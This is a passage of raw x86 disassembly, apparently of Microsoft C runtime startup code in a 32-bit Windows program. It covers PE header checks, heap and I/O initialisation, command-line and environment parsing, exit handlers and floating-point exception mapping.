  424496:	mov    edx,DWORD PTR [esi+0x8]
  424499:	mov    DWORD PTR ds:0x45dad4,edx
  42449f:	mov    esi,DWORD PTR [esi+0xc]
  4244a2:	and    esi,0x7fff
  4244a8:	mov    DWORD PTR ds:0x45dac8,esi
  4244ae:	cmp    ecx,0x2
  4244b1:	je     0x4244bf
  4244b3:	or     esi,0x8000
  4244b9:	mov    DWORD PTR ds:0x45dac8,esi
  4244bf:	shl    eax,0x8
  4244c2:	add    eax,edx
  4244c4:	mov    ds:0x45dacc,eax
  4244c9:	xor    esi,esi
  4244cb:	push   esi
  4244cc:	mov    edi,DWORD PTR ds:0x429024
  4244d2:	call   edi
  4244d4:	cmp    WORD PTR [eax],0x5a4d
  4244d9:	jne    0x4244fa
  4244db:	mov    ecx,DWORD PTR [eax+0x3c]
  4244de:	add    ecx,eax
  4244e0:	cmp    DWORD PTR [ecx],0x4550
  4244e6:	jne    0x4244fa
  4244e8:	movzx  eax,WORD PTR [ecx+0x18]
  4244ec:	cmp    eax,0x10b
  4244f1:	je     0x424512
  4244f3:	cmp    eax,0x20b
  4244f8:	je     0x4244ff
  4244fa:	mov    DWORD PTR [ebp-0x1c],esi
  4244fd:	jmp    0x424526
  4244ff:	cmp    DWORD PTR [ecx+0x84],0xe
  424506:	jbe    0x4244fa
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xf8],esi
  424510:	jmp    0x424520
  424512:	cmp    DWORD PTR [ecx+0x74],0xe
  424516:	jbe    0x4244fa
  424518:	xor    eax,eax
  42451a:	cmp    DWORD PTR [ecx+0xe8],esi
  424520:	setne  al
  424523:	mov    DWORD PTR [ebp-0x1c],eax
  424526:	push   0x1
  424528:	call   0x4252fd
  42452d:	pop    ecx
  42452e:	test   eax,eax
  424530:	jne    0x42453a
  424532:	push   0x1c
  424534:	call   0x42443b
  424539:	pop    ecx
  42453a:	call   0x425274
  42453f:	test   eax,eax
  424541:	jne    0x42454b
  424543:	push   0x10
  424545:	call   0x42443b
  42454a:	pop    ecx
  42454b:	call   0x42515d
  424550:	mov    DWORD PTR [ebp-0x4],esi
  424553:	call   0x424f5f
  424558:	test   eax,eax
  42455a:	jge    0x424564
  42455c:	push   0x1b
  42455e:	call   0x424416
  424563:	pop    ecx
  424564:	call   DWORD PTR ds:0x429054
  42456a:	mov    ds:0x45e274,eax
  42456f:	call   0x424e3d
  424574:	mov    ds:0x45dab4,eax
  424579:	call   0x424d9b
  42457e:	test   eax,eax
  424580:	jge    0x42458a
  424582:	push   0x8
  424584:	call   0x424416
  424589:	pop    ecx
  42458a:	call   0x424b68
  42458f:	test   eax,eax
  424591:	jge    0x42459b
  424593:	push   0x9
  424595:	call   0x424416
  42459a:	pop    ecx
  42459b:	call   0x424673
  4245a0:	mov    DWORD PTR [ebp-0x20],eax
  4245a3:	cmp    eax,esi
  4245a5:	je     0x4245ae
  4245a7:	push   eax
  4245a8:	call   0x424416
  4245ad:	pop    ecx
  4245ae:	mov    DWORD PTR [ebp-0x38],esi
  4245b1:	lea    eax,[ebp-0x64]
  4245b4:	push   eax
  4245b5:	call   DWORD PTR ds:0x429050
  4245bb:	call   0x424aff
  4245c0:	mov    DWORD PTR [ebp-0x68],eax
  4245c3:	test   BYTE PTR [ebp-0x38],0x1
  4245c7:	je     0x4245cf
  4245c9:	movzx  eax,WORD PTR [ebp-0x34]
  4245cd:	jmp    0x4245d2
  4245cf:	push   0xa
  4245d1:	pop    eax
  4245d2:	push   eax
  4245d3:	push   DWORD PTR [ebp-0x68]
  4245d6:	push   esi
  4245d7:	push   esi
  4245d8:	call   edi
  4245da:	push   eax
  4245db:	call   0x422f90
  4245e0:	mov    edi,eax
  4245e2:	mov    DWORD PTR [ebp-0x6c],edi
  4245e5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245e8:	jne    0x4245f0
  4245ea:	push   edi
  4245eb:	call   0x4247ab
  4245f0:	call   0x4247cd
  4245f5:	jmp    0x424622
  4245f7:	mov    eax,DWORD PTR [ebp-0x14]
  4245fa:	mov    ecx,DWORD PTR [eax]
  4245fc:	mov    ecx,DWORD PTR [ecx]
  4245fe:	mov    DWORD PTR [ebp-0x70],ecx
  424601:	push   eax
  424602:	push   ecx
  424603:	call   0x42499b
  424608:	pop    ecx
  424609:	pop    ecx
  42460a:	ret    
  42460b:	mov    esp,DWORD PTR [ebp-0x18]
  42460e:	mov    edi,DWORD PTR [ebp-0x70]
  424611:	cmp    DWORD PTR [ebp-0x1c],0x0
  424615:	jne    0x42461d
  424617:	push   edi
  424618:	call   0x4247bc
  42461d:	call   0x4247dc
  424622:	or     DWORD PTR [ebp-0x4],0xffffffff
  424626:	mov    eax,edi
  424628:	lea    esp,[ebp-0x7c]
  42462b:	call   0x42538b
  424630:	ret    
  424631:	push   0x429244
  424636:	call   DWORD PTR ds:0x429024
  42463c:	test   eax,eax
  42463e:	je     0x424656
  424640:	push   0x429234
  424645:	push   eax
  424646:	call   DWORD PTR ds:0x429020
  42464c:	test   eax,eax
  42464e:	je     0x424656
  424650:	push   DWORD PTR [esp+0x4]
  424654:	call   eax
  424656:	push   DWORD PTR [esp+0x4]
  42465a:	call   DWORD PTR ds:0x42905c
  424660:	int3   
  424661:	push   0x8
  424663:	call   0x42550f
  424668:	pop    ecx
  424669:	ret    
  42466a:	push   0x8
  42466c:	call   0x42547b
  424671:	pop    ecx
  424672:	ret    
  424673:	mov    eax,ds:0x45e270
  424678:	test   eax,eax
  42467a:	je     0x42467e
  42467c:	call   eax
  42467e:	push   esi
  42467f:	push   edi
  424680:	mov    ecx,0x42b00c
  424685:	mov    edi,0x42b018
  42468a:	xor    eax,eax
  42468c:	cmp    ecx,edi
  42468e:	mov    esi,ecx
  424690:	jae    0x4246a9
  424692:	test   eax,eax
  424694:	jne    0x4246d5
  424696:	mov    ecx,DWORD PTR [esi]
  424698:	test   ecx,ecx
  42469a:	je     0x42469e
  42469c:	call   ecx
  42469e:	add    esi,0x4
  4246a1:	cmp    esi,edi
  4246a3:	jb     0x424692
  4246a5:	test   eax,eax
  4246a7:	jne    0x4246d5
  4246a9:	push   0x4251a1
  4246ae:	call   0x425620
  4246b3:	mov    esi,0x42b000
  4246b8:	mov    eax,esi
  4246ba:	mov    edi,0x42b008
  4246bf:	cmp    eax,edi
  4246c1:	pop    ecx
  4246c2:	jae    0x4246d3
  4246c4:	mov    eax,DWORD PTR [esi]
  4246c6:	test   eax,eax
  4246c8:	je     0x4246cc
  4246ca:	call   eax
  4246cc:	add    esi,0x4
  4246cf:	cmp    esi,edi
  4246d1:	jb     0x4246c4
  4246d3:	xor    eax,eax
  4246d5:	pop    edi
  4246d6:	pop    esi
  4246d7:	ret    
  4246d8:	push   ebp
  4246d9:	mov    ebp,esp
  4246db:	push   esi
  4246dc:	push   edi
  4246dd:	push   0x8
  4246df:	call   0x42550f
  4246e4:	xor    esi,esi
  4246e6:	inc    esi
  4246e7:	cmp    DWORD PTR ds:0x45db04,esi
  4246ed:	pop    ecx
  4246ee:	jne    0x424700
  4246f0:	push   DWORD PTR [ebp+0x8]
  4246f3:	call   DWORD PTR ds:0x429064
  4246f9:	push   eax
  4246fa:	call   DWORD PTR ds:0x429060
  424700:	cmp    DWORD PTR [ebp+0xc],0x0
  424704:	mov    al,BYTE PTR [ebp+0x10]
  424707:	mov    DWORD PTR ds:0x45db00,esi
  42470d:	mov    ds:0x45dafc,al
  424712:	jne    0x424766
  424714:	mov    ecx,DWORD PTR ds:0x45e268
  42471a:	test   ecx,ecx
  42471c:	je     0x424747
  42471e:	mov    eax,ds:0x45e264
  424723:	sub    eax,0x4
  424726:	cmp    eax,ecx
  424728:	jmp    0x424740
  42472a:	mov    eax,DWORD PTR [eax]
  42472c:	test   eax,eax
  42472e:	je     0x424732
  424730:	call   eax
  424732:	mov    eax,ds:0x45e264
  424737:	sub    eax,0x4
  42473a:	cmp    eax,DWORD PTR ds:0x45e268
  424740:	mov    ds:0x45e264,eax
  424745:	jae    0x42472a
  424747:	mov    eax,0x42b01c
  42474c:	mov    esi,0x42b020
  424751:	cmp    eax,esi
  424753:	mov    edi,eax
  424755:	jae    0x424766
  424757:	mov    eax,DWORD PTR [edi]
  424759:	test   eax,eax
  42475b:	je     0x42475f
  42475d:	call   eax
  42475f:	add    edi,0x4
  424762:	cmp    edi,esi
  424764:	jb     0x424757
  424766:	mov    eax,0x42b024
  42476b:	mov    esi,0x42b028
  424770:	cmp    eax,esi
  424772:	mov    edi,eax
  424774:	jae    0x424785
  424776:	mov    eax,DWORD PTR [edi]
  424778:	test   eax,eax
  42477a:	je     0x42477e
  42477c:	call   eax
  42477e:	add    edi,0x4
  424781:	cmp    edi,esi
  424783:	jb     0x424776
  424785:	cmp    DWORD PTR [ebp+0x10],0x0
  424789:	pop    edi
  42478a:	pop    esi
  42478b:	je     0x424796
  42478d:	push   0x8
  42478f:	call   0x42547b
  424794:	jmp    0x4247a8
  424796:	push   DWORD PTR [ebp+0x8]
  424799:	mov    DWORD PTR ds:0x45db04,0x1
  4247a3:	call   0x424631
  4247a8:	pop    ecx
  4247a9:	pop    ebp
  4247aa:	ret    
  4247ab:	push   0x0
  4247ad:	push   0x0
  4247af:	push   DWORD PTR [esp+0xc]
  4247b3:	call   0x4246d8
  4247b8:	add    esp,0xc
  4247bb:	ret    
  4247bc:	push   0x0
  4247be:	push   0x1
  4247c0:	push   DWORD PTR [esp+0xc]
  4247c4:	call   0x4246d8
  4247c9:	add    esp,0xc
  4247cc:	ret    
  4247cd:	push   0x1
  4247cf:	push   0x0
  4247d1:	push   0x0
  4247d3:	call   0x4246d8
  4247d8:	add    esp,0xc
  4247db:	ret    
  4247dc:	push   0x1
  4247de:	push   0x1
  4247e0:	push   0x0
  4247e2:	call   0x4246d8
  4247e7:	add    esp,0xc
  4247ea:	ret    
  4247eb:	push   ebp
  4247ec:	mov    ebp,esp
  4247ee:	sub    esp,0x10c
  4247f4:	mov    eax,ds:0x45d430
  4247f9:	xor    eax,DWORD PTR [ebp+0x4]
  4247fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ff:	push   ebx
  424800:	push   esi
  424801:	mov    DWORD PTR [ebp-0x4],eax
  424804:	xor    edx,edx
  424806:	push   edi
  424807:	xor    eax,eax
  424809:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424810:	je     0x424818
  424812:	inc    eax
  424813:	cmp    eax,0x12
  424816:	jb     0x424809
  424818:	mov    esi,eax
  42481a:	shl    esi,0x3
  42481d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424823:	jne    0x42494c
  424829:	mov    eax,ds:0x45dabc
  42482e:	cmp    eax,0x1
  424831:	je     0x424927
  424837:	cmp    eax,edx
  424839:	jne    0x424848
  42483b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424842:	je     0x424927
  424848:	cmp    ecx,0xfc
  42484e:	je     0x42494c
  424854:	push   0x104
  424859:	lea    eax,[ebp-0x10c]
  42485f:	push   eax
  424860:	push   edx
  424861:	mov    BYTE PTR [ebp-0x8],dl
  424864:	call   DWORD PTR ds:0x42906c
  42486a:	test   eax,eax
  42486c:	jne    0x424881
  42486e:	lea    eax,[ebp-0x10c]
  424874:	push   0x42959c
  424879:	push   eax
  42487a:	call   0x425730
  42487f:	pop    ecx
  424880:	pop    ecx
  424881:	lea    eax,[ebp-0x10c]
  424887:	push   eax
  424888:	lea    edi,[ebp-0x10c]
  42488e:	call   0x425960
  424893:	inc    eax
  424894:	cmp    eax,0x3c
  424897:	pop    ecx
  424898:	jbe    0x4248c3
  42489a:	lea    eax,[ebp-0x10c]
  4248a0:	push   eax
  4248a1:	call   0x425960
  4248a6:	mov    edi,eax
  4248a8:	lea    eax,[ebp-0x10c]
  4248ae:	sub    eax,0x3b
  4248b1:	push   0x3
  4248b3:	add    edi,eax
  4248b5:	push   0x429598
  4248ba:	push   edi
  4248bb:	call   0x425830
  4248c0:	add    esp,0x10
  4248c3:	push   edi
  4248c4:	call   0x425960
  4248c9:	push   DWORD PTR [esi+0x45d1cc]
  4248cf:	mov    ebx,eax
  4248d1:	call   0x425960
  4248d6:	lea    eax,[ebx+eax*1+0x1c]
  4248da:	pop    ecx
  4248db:	add    eax,0x3
  4248de:	pop    ecx
  4248df:	and    eax,0xfffffffc
  4248e2:	call   0x4253a0
  4248e7:	mov    ebx,esp
  4248e9:	push   0x42957c
  4248ee:	push   ebx
  4248ef:	call   0x425730
  4248f4:	push   edi
  4248f5:	push   ebx
  4248f6:	call   0x425740
  4248fb:	push   0x429578
  424900:	push   ebx
  424901:	call   0x425740
  424906:	push   DWORD PTR [esi+0x45d1cc]
  42490c:	push   ebx
  42490d:	call   0x425740
  424912:	push   0x12010
  424917:	push   0x429550
  42491c:	push   ebx
  42491d:	call   0x425632
  424922:	add    esp,0x2c
  424925:	jmp    0x42494c
  424927:	push   edx
  424928:	lea    eax,[ebp+0x8]
  42492b:	push   eax
  42492c:	lea    esi,[esi+0x45d1cc]
  424932:	push   DWORD PTR [esi]
  424934:	call   0x425960
  424939:	pop    ecx
  42493a:	push   eax
  42493b:	push   DWORD PTR [esi]
  42493d:	push   0xfffffff4
  42493f:	call   DWORD PTR ds:0x429068
  424945:	push   eax
  424946:	call   DWORD PTR ds:0x42902c
  42494c:	lea    esp,[ebp-0x118]
  424952:	mov    ecx,DWORD PTR [ebp-0x4]
  424955:	xor    ecx,DWORD PTR [ebp+0x4]
  424958:	call   0x425a1c
  42495d:	pop    edi
  42495e:	pop    esi
  42495f:	pop    ebx
  424960:	leave  
  424961:	ret    
  424962:	mov    eax,ds:0x45dabc
  424967:	cmp    eax,0x1
  42496a:	je     0x424979
  42496c:	test   eax,eax
  42496e:	jne    0x42499a
  424970:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424977:	jne    0x42499a
  424979:	push   0xfc
  42497e:	call   0x4247eb
  424983:	mov    eax,ds:0x45db08
  424988:	test   eax,eax
  42498a:	pop    ecx
  42498b:	je     0x42498f
  42498d:	call   eax
  42498f:	push   0xff
  424994:	call   0x4247eb
  424999:	pop    ecx
  42499a:	ret    
  42499b:	push   ebp
  42499c:	mov    ebp,esp
  42499e:	push   ecx
  42499f:	push   ebx
  4249a0:	push   esi
  4249a1:	push   edi
  4249a2:	call   0x425203
  4249a7:	mov    edi,DWORD PTR [ebp+0x8]
  4249aa:	mov    esi,eax
  4249ac:	mov    edx,DWORD PTR [esi+0x54]
  4249af:	mov    eax,ds:0x45d2dc
  4249b4:	mov    ecx,edx
  4249b6:	cmp    DWORD PTR [ecx],edi
  4249b8:	je     0x4249c7
  4249ba:	lea    ebx,[eax+eax*2]
  4249bd:	add    ecx,0xc
  4249c0:	lea    ebx,[edx+ebx*4]
  4249c3:	cmp    ecx,ebx
  4249c5:	jb     0x4249b6
  4249c7:	lea    eax,[eax+eax*2]
  4249ca:	lea    eax,[edx+eax*4]
  4249cd:	cmp    ecx,eax
  4249cf:	jae    0x4249d5
  4249d1:	cmp    DWORD PTR [ecx],edi
  4249d3:	je     0x4249d7
  4249d5:	xor    ecx,ecx
  4249d7:	test   ecx,ecx
  4249d9:	je     0x424af1
  4249df:	mov    ebx,DWORD PTR [ecx+0x8]
  4249e2:	test   ebx,ebx
  4249e4:	mov    DWORD PTR [ebp+0x8],ebx
  4249e7:	je     0x424af1
  4249ed:	cmp    ebx,0x5
  4249f0:	jne    0x4249fe
  4249f2:	and    DWORD PTR [ecx+0x8],0x0
  4249f6:	xor    eax,eax
  4249f8:	inc    eax
  4249f9:	jmp    0x424afa
  4249fe:	cmp    ebx,0x1
  424a01:	je     0x424aec
  424a07:	mov    eax,DWORD PTR [esi+0x58]
  424a0a:	mov    DWORD PTR [ebp-0x4],eax
  424a0d:	mov    eax,DWORD PTR [ebp+0xc]
  424a10:	mov    DWORD PTR [esi+0x58],eax
  424a13:	mov    eax,DWORD PTR [ecx+0x4]
  424a16:	cmp    eax,0x8
  424a19:	jne    0x424ade
  424a1f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a25:	mov    eax,ds:0x45d2d4
  424a2a:	add    eax,edx
  424a2c:	cmp    edx,eax
  424a2e:	jge    0x424a57
  424a30:	lea    eax,[edx+edx*2]
  424a33:	shl    eax,0x2
  424a36:	mov    edi,DWORD PTR [esi+0x54]
  424a39:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a3e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a44:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a4a:	inc    edx
  424a4b:	add    ebx,edi
  424a4d:	add    eax,0xc
  424a50:	cmp    edx,ebx
  424a52:	jl     0x424a36
  424a54:	mov    ebx,DWORD PTR [ebp+0x8]
  424a57:	mov    ecx,DWORD PTR [ecx]
  424a59:	cmp    ecx,0xc000008e
  424a5f:	mov    edi,DWORD PTR [esi+0x5c]
  424a62:	jne    0x424a6d
  424a64:	mov    DWORD PTR [esi+0x5c],0x83
  424a6b:	jmp    0x424ad1
  424a6d:	cmp    ecx,0xc0000090
  424a73:	jne    0x424a7e
  424a75:	mov    DWORD PTR [esi+0x5c],0x81
  424a7c:	jmp    0x424ad1
  424a7e:	cmp    ecx,0xc0000091
  424a84:	jne    0x424a8f
  424a86:	mov    DWORD PTR [esi+0x5c],0x84
  424a8d:	jmp    0x424ad1
  424a8f:	cmp    ecx,0xc0000093
  424a95:	jne    0x424aa0
  424a97:	mov    DWORD PTR [esi+0x5c],0x85
  424a9e:	jmp    0x424ad1
  424aa0:	cmp    ecx,0xc000008d
  424aa6:	jne    0x424ab1
  424aa8:	mov    DWORD PTR [esi+0x5c],0x82
  424aaf:	jmp    0x424ad1
  424ab1:	cmp    ecx,0xc000008f
  424ab7:	jne    0x424ac2
  424ab9:	mov    DWORD PTR [esi+0x5c],0x86
  424ac0:	jmp    0x424ad1
  424ac2:	cmp    ecx,0xc0000092
  424ac8:	jne    0x424ad1
  424aca:	mov    DWORD PTR [esi+0x5c],0x8a
  424ad1:	push   DWORD PTR [esi+0x5c]
  424ad4:	push   0x8
  424ad6:	call   ebx
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x5c],edi
  424adc:	jmp    0x424ae5
  424ade:	and    DWORD PTR [ecx+0x8],0x0
  424ae2:	push   eax
  424ae3:	call   ebx
  424ae5:	mov    eax,DWORD PTR [ebp-0x4]
  424ae8:	pop    ecx
  424ae9:	mov    DWORD PTR [esi+0x58],eax
  424aec:	or     eax,0xffffffff
  424aef:	jmp    0x424afa
  424af1:	push   DWORD PTR [ebp+0xc]
  424af4:	call   DWORD PTR ds:0x429070
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	pop    ebx
  424afd:	leave  
  424afe:	ret    
  424aff:	cmp    DWORD PTR ds:0x45e26c,0x0
  424b06:	jne    0x424b0d
  424b08:	call   0x425f3c
  424b0d:	push   esi
  424b0e:	mov    esi,DWORD PTR ds:0x45e274
  424b14:	test   esi,esi
  424b16:	jne    0x424b1f
  424b18:	mov    esi,0x4295b3
  424b1d:	jmp    0x424b64
  424b1f:	mov    al,BYTE PTR [esi]
  424b21:	cmp    al,0x22
  424b23:	jne    0x424b4d
  424b25:	inc    esi
  424b26:	mov    al,BYTE PTR [esi]
  424b28:	cmp    al,0x22
  424b2a:	je     0x424b5d
  424b2c:	test   al,al
  424b2e:	je     0x424b46
  424b30:	movzx  eax,al
  424b33:	push   eax
  424b34:	call   0x425a5b
  424b39:	test   eax,eax
  424b3b:	pop    ecx
  424b3c:	je     0x424b3f
  424b3e:	inc    esi
  424b3f:	inc    esi
  424b40:	mov    al,BYTE PTR [esi]
  424b42:	cmp    al,0x22
  424b44:	jne    0x424b2c
  424b46:	cmp    BYTE PTR [esi],0x22
  424b49:	jne    0x424b5e
  424b4b:	jmp    0x424b5d
  424b4d:	cmp    al,0x20
  424b4f:	jbe    0x424b5e
  424b51:	inc    esi
  424b52:	cmp    BYTE PTR [esi],0x20
  424b55:	ja     0x424b51
  424b57:	jmp    0x424b5e
  424b59:	cmp    al,0x20
  424b5b:	ja     0x424b64
  424b5d:	inc    esi
  424b5e:	mov    al,BYTE PTR [esi]
  424b60:	test   al,al
  424b62:	jne    0x424b59
  424b64:	mov    eax,esi
  424b66:	pop    esi
  424b67:	ret    
  424b68:	push   ebx
  424b69:	xor    ebx,ebx
  424b6b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b71:	push   esi
  424b72:	push   edi
  424b73:	jne    0x424b7a
  424b75:	call   0x425f3c
  424b7a:	mov    esi,DWORD PTR ds:0x45dab4
  424b80:	xor    edi,edi
  424b82:	cmp    esi,ebx
  424b84:	jne    0x424b98
  424b86:	jmp    0x424bb8
  424b88:	cmp    al,0x3d
  424b8a:	je     0x424b8d
  424b8c:	inc    edi
  424b8d:	push   esi
  424b8e:	call   0x425960
  424b93:	pop    ecx
  424b94:	lea    esi,[esi+eax*1+0x1]
  424b98:	mov    al,BYTE PTR [esi]
  424b9a:	cmp    al,bl
  424b9c:	jne    0x424b88
  424b9e:	lea    eax,[edi*4+0x4]
  424ba5:	push   eax
  424ba6:	call   0x426072
  424bab:	mov    edi,eax
  424bad:	cmp    edi,ebx
  424baf:	pop    ecx
  424bb0:	mov    DWORD PTR ds:0x45dae4,edi
  424bb6:	jne    0x424bbd
  424bb8:	or     eax,0xffffffff
  424bbb:	jmp    0x424c15
  424bbd:	mov    esi,DWORD PTR ds:0x45dab4
  424bc3:	push   ebp
  424bc4:	jmp    0x424bf0
  424bc6:	push   esi
  424bc7:	call   0x425960
  424bcc:	mov    ebp,eax
  424bce:	inc    ebp
  424bcf:	cmp    BYTE PTR [esi],0x3d
  424bd2:	pop    ecx
  424bd3:	je     0x424bee
  424bd5:	push   ebp
  424bd6:	call   0x426072
  424bdb:	cmp    eax,ebx
  424bdd:	pop    ecx
  424bde:	mov    DWORD PTR [edi],eax
  424be0:	je     0x424c19
  424be2:	push   esi
  424be3:	push   eax
  424be4:	call   0x425730
  424be9:	pop    ecx
  424bea:	pop    ecx
  424beb:	add    edi,0x4
  424bee:	add    esi,ebp
  424bf0:	cmp    BYTE PTR [esi],bl
  424bf2:	jne    0x424bc6
  424bf4:	push   DWORD PTR ds:0x45dab4
  424bfa:	call   0x425f5a
  424bff:	mov    DWORD PTR ds:0x45dab4,ebx
  424c05:	mov    DWORD PTR [edi],ebx
  424c07:	mov    DWORD PTR ds:0x45e260,0x1
  424c11:	xor    eax,eax
  424c13:	pop    ecx
  424c14:	pop    ebp
  424c15:	pop    edi
  424c16:	pop    esi
  424c17:	pop    ebx
  424c18:	ret    
  424c19:	push   DWORD PTR ds:0x45dae4
  424c1f:	call   0x425f5a
  424c24:	mov    DWORD PTR ds:0x45dae4,ebx
  424c2a:	or     eax,0xffffffff
  424c2d:	jmp    0x424c13
  424c2f:	push   ebp
  424c30:	mov    ebp,esp
  424c32:	push   ecx
  424c33:	push   ebx
  424c34:	mov    ebx,DWORD PTR [ebp+0xc]
  424c37:	xor    edx,edx
  424c39:	cmp    DWORD PTR [ebp+0x8],edx
  424c3c:	push   edi
  424c3d:	mov    DWORD PTR [esi],edx
  424c3f:	mov    edi,ecx
  424c41:	mov    DWORD PTR [ebx],0x1
  424c47:	je     0x424c52
  424c49:	mov    ecx,DWORD PTR [ebp+0x8]
  424c4c:	add    DWORD PTR [ebp+0x8],0x4
  424c50:	mov    DWORD PTR [ecx],edi
  424c52:	cmp    BYTE PTR [eax],0x22
  424c55:	jne    0x424c65
  424c57:	xor    ecx,ecx
  424c59:	test   edx,edx
  424c5b:	sete   cl
  424c5e:	inc    eax
  424c5f:	mov    edx,ecx
  424c61:	mov    cl,0x22
  424c63:	jmp    0x424c92
  424c65:	inc    DWORD PTR [esi]
  424c67:	test   edi,edi
  424c69:	je     0x424c70
  424c6b:	mov    cl,BYTE PTR [eax]
  424c6d:	mov    BYTE PTR [edi],cl
  424c6f:	inc    edi
  424c70:	mov    cl,BYTE PTR [eax]
  424c72:	movzx  ebx,cl
  424c75:	inc    eax
  424c76:	test   BYTE PTR [ebx+0x45df21],0x4
  424c7d:	je     0x424c8b
  424c7f:	inc    DWORD PTR [esi]
  424c81:	test   edi,edi
  424c83:	je     0x424c8a
  424c85:	mov    bl,BYTE PTR [eax]
  424c87:	mov    BYTE PTR [edi],bl
  424c89:	inc    edi
  424c8a:	inc    eax
  424c8b:	test   cl,cl
  424c8d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c90:	je     0x424cc4
  424c92:	test   edx,edx
  424c94:	jne    0x424c52
  424c96:	cmp    cl,0x20
  424c99:	je     0x424ca0
  424c9b:	cmp    cl,0x9
  424c9e:	jne    0x424c52
  424ca0:	test   edi,edi
  424ca2:	je     0x424ca8
  424ca4:	and    BYTE PTR [edi-0x1],0x0
  424ca8:	and    DWORD PTR [ebp-0x4],0x0
  424cac:	cmp    BYTE PTR [eax],0x0
  424caf:	je     0x424d8b
  424cb5:	mov    cl,BYTE PTR [eax]
  424cb7:	cmp    cl,0x20
  424cba:	je     0x424cc1
  424cbc:	cmp    cl,0x9
  424cbf:	jne    0x424cc7
  424cc1:	inc    eax
  424cc2:	jmp    0x424cb5
  424cc4:	dec    eax
  424cc5:	jmp    0x424ca8
  424cc7:	cmp    BYTE PTR [eax],0x0
  424cca:	je     0x424d8b
  424cd0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cd4:	je     0x424cdf
  424cd6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cd9:	add    DWORD PTR [ebp+0x8],0x4
  424cdd:	mov    DWORD PTR [ecx],edi
  424cdf:	inc    DWORD PTR [ebx]
  424ce1:	xor    ebx,ebx
  424ce3:	inc    ebx
  424ce4:	xor    edx,edx
  424ce6:	jmp    0x424cea
  424ce8:	inc    eax
  424ce9:	inc    edx
  424cea:	cmp    BYTE PTR [eax],0x5c
  424ced:	je     0x424ce8
  424cef:	cmp    BYTE PTR [eax],0x22
  424cf2:	jne    0x424d1a
  424cf4:	test   dl,0x1
  424cf7:	jne    0x424d18
  424cf9:	cmp    DWORD PTR [ebp-0x4],0x0
  424cfd:	je     0x424d0b
  424cff:	lea    ecx,[eax+0x1]
  424d02:	cmp    BYTE PTR [ecx],0x22
  424d05:	jne    0x424d0b
  424d07:	mov    eax,ecx
  424d09:	jmp    0x424d0d
  424d0b:	xor    ebx,ebx
  424d0d:	xor    ecx,ecx
  424d0f:	cmp    DWORD PTR [ebp-0x4],ecx
  424d12:	sete   cl
  424d15:	mov    DWORD PTR [ebp-0x4],ecx
  424d18:	shr    edx,1
  424d1a:	test   edx,edx
  424d1c:	je     0x424d2b
  424d1e:	test   edi,edi
  424d20:	je     0x424d26
  424d22:	mov    BYTE PTR [edi],0x5c
  424d25:	inc    edi
  424d26:	inc    DWORD PTR [esi]
  424d28:	dec    edx
  424d29:	jne    0x424d1e
  424d2b:	mov    cl,BYTE PTR [eax]
  424d2d:	test   cl,cl
  424d2f:	je     0x424d79
  424d31:	cmp    DWORD PTR [ebp-0x4],0x0
  424d35:	jne    0x424d41
  424d37:	cmp    cl,0x20
  424d3a:	je     0x424d79
  424d3c:	cmp    cl,0x9
  424d3f:	je     0x424d79
  424d41:	test   ebx,ebx
  424d43:	je     0x424d73
  424d45:	test   edi,edi
  424d47:	je     0x424d62
  424d49:	movzx  edx,cl
  424d4c:	test   BYTE PTR [edx+0x45df21],0x4
  424d53:	je     0x424d5b
  424d55:	mov    BYTE PTR [edi],cl
  424d57:	inc    edi
  424d58:	inc    eax
  424d59:	inc    DWORD PTR [esi]
  424d5b:	mov    cl,BYTE PTR [eax]
  424d5d:	mov    BYTE PTR [edi],cl
  424d5f:	inc    edi
  424d60:	jmp    0x424d71
  424d62:	movzx  ecx,cl
  424d65:	test   BYTE PTR [ecx+0x45df21],0x4
  424d6c:	je     0x424d71
  424d6e:	inc    eax
  424d6f:	inc    DWORD PTR [esi]
  424d71:	inc    DWORD PTR [esi]
  424d73:	inc    eax
  424d74:	jmp    0x424ce1
  424d79:	test   edi,edi
  424d7b:	je     0x424d81
  424d7d:	and    BYTE PTR [edi],0x0
  424d80:	inc    edi
  424d81:	inc    DWORD PTR [esi]
  424d83:	mov    ebx,DWORD PTR [ebp+0xc]
  424d86:	jmp    0x424cac
  424d8b:	mov    eax,DWORD PTR [ebp+0x8]
  424d8e:	test   eax,eax
  424d90:	je     0x424d95
  424d92:	and    DWORD PTR [eax],0x0
  424d95:	inc    DWORD PTR [ebx]
  424d97:	pop    edi
  424d98:	pop    ebx
  424d99:	leave  
  424d9a:	ret    
  424d9b:	push   ebp
  424d9c:	mov    ebp,esp
  424d9e:	push   ecx
  424d9f:	push   ecx
  424da0:	push   ebx
  424da1:	push   esi
  424da2:	push   edi
  424da3:	xor    edi,edi
  424da5:	cmp    DWORD PTR ds:0x45e26c,edi
  424dab:	jne    0x424db2
  424dad:	call   0x425f3c
  424db2:	and    BYTE PTR ds:0x45dc14,0x0
  424db9:	push   0x104
  424dbe:	mov    esi,0x45db10
  424dc3:	push   esi
  424dc4:	push   edi
  424dc5:	call   DWORD PTR ds:0x42906c
  424dcb:	mov    eax,ds:0x45e274
  424dd0:	cmp    eax,edi
  424dd2:	mov    DWORD PTR ds:0x45daf4,esi
  424dd8:	je     0x424de1
  424dda:	cmp    BYTE PTR [eax],0x0
  424ddd:	mov    ebx,eax
  424ddf:	jne    0x424de3
  424de1:	mov    ebx,esi
  424de3:	lea    eax,[ebp-0x4]
  424de6:	push   eax
  424de7:	push   edi
  424de8:	lea    esi,[ebp-0x8]
  424deb:	xor    ecx,ecx
  424ded:	mov    eax,ebx
  424def:	call   0x424c2f
  424df4:	mov    esi,DWORD PTR [ebp-0x4]
  424df7:	mov    eax,DWORD PTR [ebp-0x8]
  424dfa:	shl    esi,0x2
